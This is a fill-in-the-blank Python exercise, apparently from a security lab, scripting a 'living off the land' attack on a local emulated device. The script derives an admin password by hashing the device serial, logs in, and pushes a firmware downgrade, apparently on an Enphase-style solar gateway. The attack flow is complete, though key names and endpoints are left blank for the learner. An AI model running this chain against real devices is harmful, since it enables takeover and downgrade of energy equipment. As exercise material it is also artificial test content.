import requests
import hashlib
from utils.logger import log_message

TARGET = "http://localhost:5000"

def run_lotl_attack():
    try:
        # Step 1: Get device info
        info = requests.get(f"{TARGET}/____").json()
        serial = info["__________"]  # Fill in the key
        password = hashlib.__________(serial.encode()).hexdigest()[:8]

        log_message(f"Serial: {serial}", level="INFO")
        log_message(f"Derived password: {password}", level="INFO")

        # Step 2: Authenticate
        login = requests.post(f"{TARGET}/api/____", json={
            "username": "admin",
            "password": _________  # Fill in the variable
        })

        if login.status_code != 200:
            log_message("Login failed", level="ERROR")
            return

        token = login.json()["_____"]  # Fill in the key
        headers = {
            "Authorization": token,
            "Content-Type": "application/json"
        }

        log_message("Authenticated successfully", level="INFO")

        # Step 3: Launch downgrade attack
        log_message("Attempting firmware downgrade...", level="INFO")

        payload = {
            "firmware_url": "https://firmware-cache.local/enphase/____"  # Fill in firmware file
        }

        response = requests.post(f"{TARGET}/installer/upgrade_start",
                                 headers=headers,
                                 json=payload)

        if response.status_code == 200:
            resp_json = response.json()
            log_message(f"LoTL attack successful: {resp_json['message']}", level="INFO")
            log_message(f"Device downgraded to: {resp_json['version']}", level="INFO")
        else:
            log_message(f"LoTL attack failed: {response.text}", level="ERROR")

    except Exception as e:
        log_message(f"Unexpected error: {e}", level="ERROR")
